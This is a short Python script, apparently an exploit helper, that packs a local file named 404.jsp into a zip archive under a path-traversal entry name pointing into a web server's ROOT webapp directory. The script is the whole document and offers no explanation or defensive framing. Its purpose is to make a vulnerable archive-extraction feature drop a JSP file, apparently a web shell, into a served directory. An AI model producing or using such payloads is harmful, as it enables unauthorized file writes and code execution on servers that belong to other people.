#coding=utf-8

import zipfile  
import sys

if __name__ == "__main__":  
    try:
        with open("404.jsp", "r") as f:
            binary = f.read()
            zipFile = zipfile.ZipFile("test.zip", "a", zipfile.ZIP_DEFLATED)
            info = zipfile.ZipInfo("test.zip")
            zipFile.writestr("..\\webapps\\ROOT\\404.jsp", binary)
            zipFile.close()
    except IOError as e:
        raise e
